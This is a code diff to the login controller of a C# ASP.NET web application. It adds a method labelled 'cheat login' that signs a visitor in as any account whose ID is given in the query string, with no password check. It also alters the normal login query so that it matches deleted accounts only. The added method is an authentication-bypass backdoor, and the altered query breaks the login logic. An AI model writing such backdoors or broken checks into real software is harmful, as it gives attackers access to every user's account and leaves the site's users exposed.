@@ -17,6 +17,20 @@ namespace Banner.Areas.Web.Controllers
 
             return View();
         }
+        #region 作弊登入
+        public void LoginACID()
+        {
+            int ACID = GetQueryStringInInt("ACID");
+            var AC = DC.Account.FirstOrDefault(q => q.ACID == ACID);
+            if (AC != null)
+            {
+                SetBrowserData("ACID", AC.ACID.ToString());
+                SetBrowserData("UserName", AC.Name_First + AC.Name_Last);
+                Response.Redirect("/Web/Home/Index");
+            }
+
+        }
+        #endregion
         #region 登入
         public ActionResult Login()
         {
@@ -59,7 +73,7 @@ namespace Banner.Areas.Web.Controllers
             else
             {
                 string EncPW = HSM.Enc_1(PW);
-                var AC = DC.Account.FirstOrDefault(q => q.ActiveFlag && !q.DeleteFlag && q.Login == Login && q.Password == EncPW);
+                var AC = DC.Account.FirstOrDefault(q => q.ActiveFlag && q.DeleteFlag && q.Login == Login && q.Password == EncPW);
                 if (AC == null)
                 {
                     AC = DC.Account.Where(q => q.Login == Login && q.ActiveFlag && !q.DeleteFlag).OrderByDescending(q => q.CreDate).FirstOrDefault();
